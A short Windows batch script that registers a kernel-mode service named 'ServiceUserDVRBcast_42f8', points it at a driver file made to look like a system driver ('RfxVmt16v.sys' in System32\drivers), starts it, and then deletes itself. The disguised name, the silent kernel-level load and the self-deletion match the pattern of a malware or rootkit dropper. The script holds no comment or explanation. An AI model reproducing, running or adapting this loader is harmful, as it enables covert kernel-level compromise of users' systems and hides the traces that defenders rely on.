@echo off
cd %~dp0
sc create ServiceUserDVRBcast_42f8 binpath=C:\Windows\System32\drivers\RfxVmt16v.sys type=kernel
sc start ServiceUserDVRBcast_42f8
del "%~f0"



